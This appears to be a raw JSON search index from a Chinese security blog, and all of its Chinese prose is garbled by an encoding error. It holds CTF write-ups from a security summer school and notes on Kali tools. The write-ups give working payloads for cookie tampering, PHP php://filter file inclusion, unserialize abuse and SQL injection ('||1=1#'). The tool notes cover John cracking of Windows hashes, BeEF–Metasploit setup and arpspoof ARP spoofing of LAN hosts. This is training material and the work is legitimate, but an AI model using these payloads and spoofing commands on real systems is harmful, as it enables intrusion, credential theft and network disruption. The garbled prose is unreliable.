åœ¨ç•™è¨€æ¿ç•Œé¢ä»»æ„ç•™è¨€å¹¶æŠ“åŒ…ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ª isLogin=0 çš„ Cookie å’Œ userlevel=guest çš„å‚æ•°ï¼Œåˆ†åˆ«ä¿®æ”¹ä¸º 1 å’Œ root å³å¯ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:2:2","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Level6 240610708 å’Œ QNKCDZO çš„ MD5 å€¼ç›¸åŒã€‚ ","date":"2019-07-23","objectID":"/summer-school/:2:3","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Level7 æ ¹æ®åŠ å¯†å‡½æ•°å†™è§£å¯†ç¨‹åº decode.phpï¼š \u003c?php function decode($s) { $_ = base64_decode(strrev(str_rot13($s))); $_o = ''; for ($_0 = 0; $_0 \u003c strlen($_); ++$_0) { $_c = substr($_, $_0, 1); $__ = ord($_c) - 1; $_c = chr($__); $_o .= $_c; } return strrev($_o); } echo decode($_GET['str']); ?\u003e ç„¶åæœ¬æœºå¼€ä¸ªæœåŠ¡å™¨ï¼ˆæˆ‘çš„æ˜¯ 8082 ç«¯å£ï¼‰ï¼Œdecode.php æ”¾åœ¨ www ç›®å½•é‡Œï¼Œè®¿é—® http://localhost:8082/decode.php?str=pJovuTsWOUrtIJZtcKZ2OJMzEJZyMTLdIas å³å¯ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:2:4","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Level8 check.js æ˜¯ packer åŠ å¯†ï¼Œç›´æ¥å»æ‰ eval æ”¾æ§åˆ¶å°è·‘ä¸€ä¸‹å¾—åˆ° js æºç ã€‚ _f = function () { var f = document.createElement(\"form\"); document.getElementById('login').appendChild(f); f.name = \"login\"; return f }(); _uname = function () { var uname = document.createElement(\"input\"); uname.type = \"text\"; uname.id = \"uname\"; uname.value = 'Input Username'; uname.style.margin = \"0px 0px 0px 60px\"; _f.appendChild(uname); uname.onfocus = function () { if (this.value =='Input Username') this.value ='' }; uname.onblur = function () { if (this.value =='') this.value ='Input Username' }; return uname }(); _br = function () { var br = document.createElement(\"br\"); _f.appendChild(br); br = document.createElement(\"br\"); _f.appendChild(br); return br }(); _upass = function () { var upass = document.createElement(\"input\"); upass.type = \"password\"; upass.id = \"upass\"; upass.value = 'Input Password'; upass.style.margin = \"0px 0px 0px 60px\"; _f.appendChild(upass); upass.onfocus = function () { if (this.value =='Input Password') this.value ='' }; upass.onblur = function () { if (this.value =='') this.value ='Input Password' }; return upass }(); _btn = function () { var btn = document.createElement(\"input\"); _f.appendChild(btn); btn.type = \"button\"; btn.value = \"login\"; btn.onclick = function () { uname = document.getElementById('uname').value; upass = document.getElementById('upass').value; if (uname ==\"\") alert('Please Input Username!'); else if (upass ==\"\") alert('Please Input Password!'); else { eval(unescape(\"var%20strKey1%20%3D%20%22JaVa3C41ptIsAGo0DStAff%22%3B%0Avar%20strKey2%20%3D%20%22CaNUknOWThIsK3y%22%3B%0Avar%20strKey3%20%3D%20String.fromCharCode%2871%2C%2048%2C%20111%2C%20100%2C%2033%29%3B%0Aif%20%28uname%20%3D%3D%20%28strKey3%20+%20%28%28%28strKey1.toLowerCase%28%29%29.substring%280%2C%20strKey1.indexOf%28%220%22%29%29%20+%20strKey2.substring%282%2C%206%29%29.toUpperCase%28%29%29.substring%280%2C%2015%29%29%29%20%7B%0A%20%20%20%20var%20strKey4%20%3D%20%27Java_Scr1pt_Pa4sW0rd_K3y_H3re%27%3B%0A%20%20%20%20if%20%28upass%20%3D%3D%20%28strKey4.substring%28strKey4.indexOf%28%271%27%2C%205%29%2C%20strKey4.length%20-%20strKey4.indexOf%28%27_%27%29%20+%205%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Login%20Success%21%27%29%3B%0A%20%20%20%20%20%20%20%20document.getElementById%28%27key%27%29.innerHTML%20%3D%20unescape%28%22%253Cfont%2520color%253D%2522%2523000%2522%253Ea2V5X0NoM2NrXy50eHQ%3D%253C/font%253E%22%29%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Password%20Error%21%27%29%3B%0A%20%20%20%20%7D%0A%7D%20else%20%7B%0A%20%20%20%20alert%28%27Login%20Failed%21%27%29%3B%0A%7D\")) } }; return false }(); åªæœ‰æœ€åä¸€ä¸ª else é‡Œçš„ä»£ç æ¯”è¾ƒé‡è¦ï¼Œå»æ‰ eval è¿è¡Œå¾—ï¼š var strKey1 = \"JaVa3C41ptIsAGo0DStAff\"; var strKey2 = \"CaNUknOWThIsK3y\"; var strKey3 = String.fromCharCode(71, 48, 111, 100, 33); if (uname == (strKey3 + (((strKey1.toLowerCase()).substring(0, strKey1.indexOf(\"0\")) + strKey2.substring(2, 6)).toUpperCase()).substring(0, 15))) { var strKey4 = 'Java_Scr1pt_Pa4sW0rd_K3y_H3re'; if (upass == (strKey4.substring(strKey4.indexOf('1', 5), strKey4.length - strKey4.indexOf('_') + 5))) { alert('Login Success!'); document.getElementById('key').innerHTML = unescape(\"%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E\"); } else { alert('Password Error!'); } } else { alert('Login Failed!'); } ä¾æ¬¡è¿è¡Œï¼š 1. var strKey1 = \"JaVa3C41ptIsAGo0DStAff\"; var strKey2 = \"CaNUknOWThIsK3y\"; var strKey3 = String.fromCharCode(71, 48, 111, 100, 33); var strKey4 = 'Java_Scr1pt_Pa4sW0rd_K3y_H3re'; strKey3 + (((strKey1.toLowerCase()).substring(0, strKey1.indexOf(\"0\")) + strKey2.substring(2, 6)).toUpperCase()).substring(0, 15) strKey4.substring(strKey4.indexOf('1', 5), strKey4.length - strKey4.indexOf('_') + 5) å¾—åˆ°ç”¨æˆ·å G0od!JAVA3C41PTISAGO å’Œå¯†ç  1pt_Pa4sW0rd_K3y_H3reï¼Œä¸è¿‡ä¸ç”¨ç™»å½•ï¼Œå› ä¸º key ä¹Ÿå¯ä»¥ç›´æ¥å¾—åˆ°ã€‚è¿è¡Œ unescape(\"%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E\")ï¼Œå¾—åˆ°ï¼š \u003cfont color=\"#000\"\u003ea2V5X0NoM2NrXy50eHQ=\u003c/font\u003e base64 è§£ç å¾— key_Ch3ck_.txtï¼Œæ‰“å¼€å‘ç°é‡Œé¢åªæœ‰ Ch3ck_Au7h.phpï¼Œä½†æ˜¯æ‰“å¼€å‘ç°åªæ˜¾ç¤º Yo","date":"2019-07-23","objectID":"/summer-school/:2:5","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Level10 æç¤º LFIï¼Œå¹¶ä¸” html è¡¨å•ä¸­æœ‰ä¸€ä¸ª file å‚æ•°ï¼Œå› æ­¤è€ƒè™‘ç”¨ PHP ä¼ªåè®®ï¼Œè¾“å…¥æ¡†ä¸­è¾“å…¥ï¼š php://filter/read=convert.base64-encode/resource=index.php flag ç›´æ¥å†™æ­»åœ¨æºç ä¸­äº†ã€‚ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:2:6","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Level11 å­˜åœ¨å¤‡ä»½æ–‡ä»¶ index.php.swpï¼š function clear($string){ // è¿™æ˜¯è¿‡æ»¤å‡½æ•°å“¦~ } $userInfo = @unserialize($_REQUEST['userInfo']); $query = 'SELECT * FROM users WHERE id = \\''.clear($userInfo['id']).'\\' AND password = \\''.clear($userInfo['pass']).'\\';'; $result = mysql_query($query); if(!$result || mysql_num_rows($result) \u003c1){ die('Invalid password!'); } $row = mysql_fetch_assoc($result); foreach($row as $key =\u003e $value){ $userInfo[$key] = $value; } $oldPass = @$_REQUEST['oldPass']; $newPass = @$_REQUEST['newPass']; if($oldPass == $userInfo['password']){ $userInfo['password'] = $newPass; $query = 'UPDATE users SET pass = \\''.clear($newPass).'\\' WHERE id = \\''.clear($userInfo['id']).'\\';'; mysql_query($query); echo 'Password Changed Success.\u003cbr\u003e'; } else{ echo 'Invalid old password entered.'; } é¦–å…ˆå¯¹ userInfo è¿›è¡Œååºåˆ—åŒ–ï¼Œéšåè¦æ±‚ä¸¤ä¸ªå‚æ•° oldPass å’Œ newPassï¼Œåè€…éšæ„è®¾ç½®ï¼Œå‰è€…å¾ˆå®¹æ˜“å¾—åˆ°ã€‚åœ¨ Cookie ä¸­å‘ç° pass=OTA0OGM1MGUwOTJmM2IyZWRlYzM5NTFiZjdiZGFlNTA%3D; id=3ï¼Œè¿›è¡Œ base64 è§£ç å’Œ md5 è§£å¯†åå¾—åˆ° oldPass=20151231ã€‚ æœ€åå°±æ˜¯åœ¨ payload ä¸­æ„é€ ä¸€ä¸ªåºåˆ—åŒ–çš„ userInfo æ•°ç»„ï¼Œpayload: changepassword.php?userInfo=a:2:{s:2:\"id\";i:1;s:4:\"pass\";s:8:\"20151231\";}\u0026oldPass=20151231\u0026newPass=11111111 ","date":"2019-07-23","objectID":"/summer-school/:2:7","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Level12 å¤‡ä»½æ–‡ä»¶ index.php.ï¼š \u003c?php #GOAL: get password from admin; error_reporting(0); require 'DB_config_inc.php'; dvwaDatabaseConnect(); $_CONFIG['Security']=true; //if register globals = on, undo var overwrites foreach(array('_GET','_POST','_REQUEST','_COOKIE') as $method){ foreach($$method as $key=\u003e$value){ unset($$key); } } function clear($string){ //filter function here } $username = isset($_POST['username']) ? clear($_POST['username']) : die('Please enter in a username.'); $password = isset($_POST['password']) ? clear($_POST['password']) : die('Please enter in a password.'); if($_CONFIG['Security']){ $username=preg_replace('#[^a-z0-9_-]#i','',$username); $password=preg_replace('#[^a-z0-9_-]#i','',$password); } if (is_array($username)){ foreach ($username as $key =\u003e $value) { $username[$key] = $value; } } $query='SELECT * FROM users WHERE user=\\''.$username[0].'\\' AND password=\\''.$password.'\\';'; $result=mysql_query($query); if($result \u0026\u0026 mysql_num_rows($result) \u003e 0){ echo('flag:{*********}'); exit(); } else{ echo(\"\u003cscript\u003ealert(\\\"Invalid password!\\\")\u003c/script\u003e\"); exit(); } ?\u003e å¦‚æœ $_CONFIG['security'] ä¸º trueï¼Œé‚£ä¹ˆæˆ‘ä»¬æ— æ³•ä¼ å…¥ username å’Œ passwordï¼Œå› æ­¤éœ€è¦è¦†ç›– $_CONFIGã€‚éšåå°±æ˜¯æ³¨å…¥äº†ï¼Œpayload: username='\u0026password=||1=1#\u0026Submit=%E6%8F%90%E4%BA%A4\u0026_CONFIG=aaa ","date":"2019-07-23","objectID":"/summer-school/:2:8","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Level13 ç»æµ‹è¯•ï¼Œåªæœ‰ php5 åç¼€çš„æ–‡ä»¶å¯ä»¥ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯ç»è¿‡ä¸€æ®µå¾ˆçŸ­çš„å»¶æ—¶ååˆä¼šè¢«åˆ æ‰ã€‚æ‰€ä»¥éœ€è¦å†™ä¸¤ä¸ªè„šæœ¬ï¼Œä¸€ä¸ªä¸Šä¼ ä¸€ä¸ªä¸‹è½½åŒæ—¶è¿›è¡Œï¼Œæœ€åå‘ç°ä¸‹è½½ä¸‹æ¥çš„åˆšæ‰ä¸Šä¼ çš„æ–‡ä»¶é‡ŒåŒ…å« flagã€‚ ","date":"2019-07-23","objectID":"/summer-school/:2:9","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Day4 \u0026 Day5 ç»ƒä¹ èµ›ï¼Œæ²¡æ¥å¾—åŠè®°å½•å…·ä½“ writeupï¼Œé å›å¿†æ•´ç†ä¸€ç‚¹å·¥å…·çš„ä½¿ç”¨ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:3:0","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"John ç ´è§£ DES john des.txt john --show des.txt ","date":"2019-07-23","objectID":"/summer-school/:3:1","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"John ç ´è§£ Windows ç®¡ç†å‘˜å¯†ç  æ³¨ï¼šWindows ä¸‹æ•£åˆ—å‡½æ•°ä¸º NTLMã€‚ john --format=NT sam.txt ","date":"2019-07-23","objectID":"/summer-school/:3:2","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Python åº“ Steganography å‘½ä»¤è¡Œä½¿ç”¨ steganography -e input.jpg output.jpg 'flag{..}' steganography -d stego.png ","date":"2019-07-23","objectID":"/summer-school/:3:3","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"F5-Steganography ä½¿ç”¨ java Extract stego.jpg -p 123456 ","date":"2019-07-23","objectID":"/summer-school/:3:4","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"steghide ä½¿ç”¨ steghide embed -cf picture.jpg -ef secret.txt steghide extract -sf picture.jpg ","date":"2019-07-23","objectID":"/summer-school/:3:5","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"å›¾ç‰‡éšå†™å‹ç¼©åŒ… / å›¾ç‰‡ copy /b 1.jpg+1.zip new.jpg copy /b 2.jpg+3.jpg 23.jpg ","date":"2019-07-23","objectID":"/summer-school/:3:6","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"RSA - å·²çŸ¥ p,q,e å¦‚æœåªçŸ¥é“ n ä¸” n ä½æ•°ä¸å¤§ï¼Œå¯ä»¥åœ¨çº¿åˆ†è§£å¾— p,qã€‚ import gmpy2 p = ... q = ... e = ... c = ... # c = pow(m, e, p*q) d = gmpy2.invert(e, (p-1)*(q-1)) m = pow(c, d, p*q) ","date":"2019-07-23","objectID":"/summer-school/:3:7","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Misc - æœªçŸ¥é¢†åŸŸ ä¾‹å¦‚å¯¹äºæµé‡åŒ…ï¼Œvmdk æ–‡ä»¶ï¼Œapk æ–‡ä»¶ç­‰ç­‰ä¸ç†Ÿæ‚‰çš„æ–‡ä»¶çš„åˆ†æï¼Œéƒ¨åˆ†ç®€å•é¢˜å¯ä»¥é€šè¿‡æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€å¹¶æœç´¢å­—ç¬¦ä¸²ã€‚å¯¹äºæŸåçš„æµé‡åŒ…å°¤ä¸ºæœ‰æ•ˆã€‚ ","date":"2019-07-23","objectID":"/summer-school/:3:8","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"å“ˆå¸Œè¿˜åŸ ç»™å®šæ˜æ–‡èŒƒå›´å’Œå“ˆå¸Œå‰åä¸ªå­—ç¬¦ï¼Œæ±‚æ˜æ–‡ä¸å“ˆå¸Œå€¼ã€‚ç®€é™‹çš„ php ç‰ˆæœ¬ï¼š \u003c?php $str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $len = strlen($str); for($i = 0; $i \u003c $len-1; ++$i) { for($j = 0; $j \u003c $len-1; ++$j) { for($k = 0; $k \u003c $len-1; ++$k) { for($l = 0; $l \u003c $len-1; ++$l) { $ret = md5($str[$i].$str[$j].$str[$k].$str[$l]); if(substr($ret, 0, 10) == 'c2979c7124') { echo $ret; die(); } } } } } ?\u003e æ¯”è¾ƒèˆ’æœçš„ python ç‰ˆæœ¬ï¼š import hashlib import itertools key = 'c2979c7124' dir = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' dir_list = itertools.product(dir, repeat=4) for i in dir_list: res = hashlib.md5(''.join(i)).hexdigest() if res[0:10] == key: print i print res ","date":"2019-07-23","objectID":"/summer-school/:3:9","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"SQL æ³¨å…¥æµé‡åŒ…åˆ†æ è¿‡æ»¤å‡º http æ•°æ®åŒ…ã€‚ å®šä½å…³é”®çš„æ³¨å…¥æ•°æ®åŒ…æ‰€åœ¨çš„åŒºé—´ï¼Œè§‚å¯Ÿæ³¨å…¥è¯­å¥åˆ¤æ–­æ˜¯å¦æ˜¯ç›²æ³¨ã€‚ éç›²æ³¨ï¼šå…³æ³¨å“åº”ä¿¡æ¯ï¼Œç›´æ¥åœ¨å“åº”ä¿¡æ¯ä¸­å¾—åˆ° flagã€‚ ç›²æ³¨ï¼šå…³æ³¨æ³¨å…¥è¯­å¥ï¼Œå¯¼å‡º HTTP å¯¹è±¡åˆ° txt å¹¶å†™è„šæœ¬åˆ†æå‡º flagã€‚ ","date":"2019-07-23","objectID":"/summer-school/:3:10","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"æ€»ç»“ æš‘æœŸå­¦æ ¡ä¸»è¦è¿˜æ˜¯é¢å‘é›¶åŸºç¡€çš„åŒå­¦ï¼Œå› æ­¤èƒ½å­¦åˆ°çš„ä¸œè¥¿ä¸ç®—å¤ªå¤šã€‚æ¥ä¸‹æ¥åº”è¯¥ä¼šé‡ç‚¹å­¦ä¹ å„ç±»å·¥å…·çš„ä½¿ç”¨ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:4:0","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"æ²¡æœ‰ä»€ä¹ˆå‘ç‚¹ã€‚ ","date":"2019-07-21","objectID":"/beef-msf/:0:0","tags":["Kali"],"title":"Beef åŠ è½½ Metasploit æ’ä»¶ \u0026 Metasploit è¿æ¥ PostgreSQL","uri":"/beef-msf/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"Beef åŠ è½½ Metasploit æ’ä»¶ ä¿®æ”¹ beef çš„é…ç½®æ–‡ä»¶ /usr/share/beef-xss/config.yamlï¼Œæ‰¾åˆ° extension ä¸‹çš„ metasploit å­—æ®µï¼Œä¿®æ”¹ä¸º trueã€‚æ­¤å¤–ï¼Œå»ºè®®ä¿®æ”¹ credentials ä¸‹çš„å¯†ç å­—æ®µã€‚ éšåä¿®æ”¹ /usr/share/beef-xss/extensions/metasploit/config.yamlï¼Œæ‰¾åˆ° beef-\u003eextension-\u003emetasploit ä¸‹çš„ host å’Œ callback_host å­—æ®µï¼Œéƒ½æ”¹ä¸ºè™šæ‹Ÿæœºçš„å†…ç½‘ IPã€‚æœ€åï¼Œåœ¨å€’æ•°ç¬¬äºŒè¡Œæ‰¾åˆ°ï¼š { \"os\": \"custom\", \"path\": \"\" } æ”¹ä¸ºï¼š { \"os\": \"custom\", \"path\": \"/usr/share/metasploit-framework/\" } é…ç½®æ–‡ä»¶ä¿®æ”¹å®Œåï¼Œå¯åŠ¨ msfconsoleï¼Œè¾“å…¥ï¼š $ load msgrpc ServerHost=192.168.159.135 Pass=abc123 æ¥å¯ç”¨ msgrpc æ’ä»¶ã€‚å…¶ä¸­ ServerHost å­—æ®µæ˜¯æœ¬æœºå†…ç½‘ IPï¼ŒPass å­—æ®µé»˜è®¤æ˜¯ abc123ï¼Œå¯ä»¥åœ¨ä¸Šé¢çš„ /usr/share/beef-xss/extensions/metasploit/config.yaml é‡Œä¿®æ”¹ã€‚ å›åˆ° beef-xss ç›®å½•é‡Œè¿è¡Œ ./beef -xï¼Œä½¿å¾—ä¿®æ”¹åçš„é…ç½®æ–‡ä»¶ç”Ÿæ•ˆã€‚è‡³æ­¤ï¼ŒMSF æ’ä»¶å·²ç»åŠ è½½å®Œæ¯•ã€‚ ","date":"2019-07-21","objectID":"/beef-msf/:1:0","tags":["Kali"],"title":"Beef åŠ è½½ Metasploit æ’ä»¶ \u0026 Metasploit è¿æ¥ PostgreSQL","uri":"/beef-msf/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"Metasploit è¿æ¥ PostgreSQL $ service postgresql start $ msfdb init è¿™æ ·ä¸¤æ­¥å°±å¤Ÿäº†ï¼Œæ£€æŸ¥æ˜¯å¦æˆåŠŸï¼š $ msfconsole $ db_status è¿æ¥ä»¥åå°±å¯ä»¥ä½¿ç”¨ PostgreSQL å­˜å‚¨æˆ‘ä»¬æ”¶é›†åˆ°çš„ä¿¡æ¯äº†ï¼Œä¾‹å¦‚åœ¨ msfconsole ä¸­æ‰§è¡Œ nmap ä¸ä¼šå½±å“æ•°æ®åº“ï¼Œä½† db_nmap çš„ç»“æœåˆ™ä¼šå­˜åˆ°æ•°æ®åº“é‡Œã€‚ ","date":"2019-07-21","objectID":"/beef-msf/:2:0","tags":["Kali"],"title":"Beef åŠ è½½ Metasploit æ’ä»¶ \u0026 Metasploit è¿æ¥ PostgreSQL","uri":"/beef-msf/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å…³äº Ettercap çš„æœ‰è¶£ä¾‹å­ã€‚ ","date":"2019-07-20","objectID":"/ettercap/:0:0","tags":["Kali","DNS","ç½‘ç»œ"],"title":"Ettercap ç®€æ˜“å…¥é—¨","uri":"/ettercap/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å®‰è£…ä¸é…ç½® å®‰è£…å¾ˆå®¹æ˜“ï¼š $ apt install ettercap-text-only ä½¿ç”¨å‰éœ€è¦ä¿®æ”¹é…ç½®ï¼Œç»™äºˆ Ettercap è¶³å¤Ÿçš„æƒé™ã€‚é…ç½®æ–‡ä»¶ä½äº /etc/ettercap/etter.confï¼Œæ‰¾åˆ°ï¼š [priv] ec_uid = 65500 ec_gid = 65500 å°†ä¸¤ä¸ªå€¼éƒ½ä¿®æ”¹ä¸º 0ï¼Œè¡¨ç¤ºç»™äºˆ root æƒé™ã€‚ å¦å¤–ï¼Œå¦‚æœæƒ³å—…æ¢ https åŒ…åˆ™éœ€è¦æ ¹æ®é…ç½®æ–‡ä»¶çš„æç¤ºå»é™¤æŒ‡å®šçš„æ³¨é‡Šã€‚æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯ Linux ç³»ç»Ÿï¼Œé˜²ç«å¢™ä¸º iptablesï¼Œæ‰€ä»¥æˆ‘å–æ¶ˆæ³¨é‡Šäº† 177 å’Œ 178 ä¸¤è¡Œã€‚ # if you use iptables: redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" ","date":"2019-07-20","objectID":"/ettercap/:1:0","tags":["Kali","DNS","ç½‘ç»œ"],"title":"Ettercap ç®€æ˜“å…¥é—¨","uri":"/ettercap/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ARP æ¬ºéª— æˆ‘ä»¬çŸ¥é“ï¼ŒARP è¯·æ±‚åŒ…æ˜¯å¹¿æ’­å‘é€çš„ï¼Œç„¶è€Œ ARP åº”ç­”åŒ…åˆ™æ˜¯å•æ’­å‘é€çš„ã€‚å› æ­¤é€šè¿‡ Ettercapï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ”¶åˆ°åŒä¸€ç½‘æ®µå†…çš„å…¶å®ƒä¸»æœºå¹¿æ’­çš„ ARP è¯·æ±‚åï¼Œå‘å®ƒä»¬å‘é€ ARP åº”ç­”åŒ…ï¼Œä½¿å®ƒä»¬è®¤ä¸ºæˆ‘ä»¬çš„ä¸»æœºå°±æ˜¯ç½‘å…³ã€‚è¿™æ ·ä¸€æ¥ï¼Œä»»ä½•å‘é€è‡³å¤–ç½‘çš„è¯·æ±‚éƒ½å°†ç»è¿‡æˆ‘ä»¬çš„ä¸»æœºã€‚ å¦‚æœæˆ‘ä»¬æˆåŠŸå®æ–½äº† ARP æ¬ºéª—ï¼Œä½œä¸ºä¸€ä¸ªä¼ªç½‘å…³ï¼Œå°±å¯ä»¥æˆªè·åŒç½‘æ®µå†…æ‰€æœ‰å‘é€è‡³å¤–ç½‘çš„æµé‡ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸å†å°†è¿™äº›æ•°æ®åŒ…è½¬å‘è‡³å¤–ç½‘ï¼Œè¿™å°†ä½¿å¾—è¯¥ç½‘æ®µå†…æ‰€æœ‰å…¶å®ƒä¸»æœºæ— æ³•ä¸Šç½‘ï¼š $ arpspoof -i eth0 -t 192.168.159.128 192.168.159.2 å…¶ä¸­ -i æŒ‡å®šç½‘å¡æ¥å£ï¼Œ-t æŒ‡å®šè¦æ¬ºéª—çš„ç›®æ ‡ä¸»æœºï¼Œæœ€åçš„ IP åœ°å€æ˜¯æœ¬ç½‘æ®µå†…çœŸæ­£çš„ç½‘å…³åœ°å€ã€‚å¦‚ä½•æŸ¥çœ‹çœŸæ­£çš„ç½‘å…³åœ°å€å‘¢ï¼Ÿ ç®€ä¾¿çš„æ–¹æ³•æ˜¯ç›´æ¥æŸ¥çœ‹å½“å‰è¿æ¥çš„ç½‘ç»œå±æ€§ï¼Œé‡Œé¢ä¼šç›´æ¥æ˜¾ç¤º é»˜è®¤ç½‘å…³ å­—æ®µã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯ traceroute ä»»æ„å¤–ç½‘ç½‘å€ ï¼Œè¿™æ ·ç¬¬ä¸€è·³çš„åœ°å€å¿…å®šæ˜¯ç½‘å…³åœ°å€ã€‚ $ traceroute baidu.com traceroute to baidu.com (123.125.114.144), 30 hops max, 60 byte packets 1 _gateway (192.168.159.2) 0.947 ms 0.819 ms 0.681 ms^C ç»“æœï¼š å›¾ 1 \" å›¾ 1 å›¾ 2 \" 